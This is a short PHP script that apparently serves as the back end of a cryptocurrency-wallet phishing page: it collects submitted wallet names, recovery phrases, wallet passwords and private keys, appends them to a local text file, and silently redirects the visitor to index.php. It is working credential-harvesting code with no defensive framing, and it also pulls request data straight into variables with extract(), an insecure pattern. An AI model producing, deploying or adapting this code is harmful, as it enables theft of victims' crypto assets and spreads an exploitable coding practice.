<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

    fwrite($file,"wallet :");
    fwrite($file, $wallet ."\n");
    fwrite($file,"phrase :");
    fwrite($file, $phrase ."\n");
    fwrite($file,"walletPassword :");
    fwrite($file, $walletPassword ."\n");
	fwrite($file,"privateKey :");
    fwrite($file, $privateKey ."\n");
    fclose($file);
    header("location: index.php");
 ?>

